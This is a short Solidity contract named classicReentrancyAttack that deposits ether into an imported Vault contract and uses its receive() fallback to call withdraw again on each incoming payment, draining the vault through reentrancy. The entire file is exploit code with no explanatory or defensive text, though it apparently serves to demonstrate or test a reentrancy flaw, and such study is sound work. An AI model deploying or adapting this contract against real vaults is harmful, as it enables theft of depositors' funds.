// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Vault.sol";

contract classicReentrancyAttack {
    Vault vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 balance = vault.balanceOf(address(this));
        vault.withdraw(balance);
    }

    receive() external payable {
        uint256 balance = vault.balanceOf(address(this));
        try vault.withdraw(balance) {} catch {}
    }
}
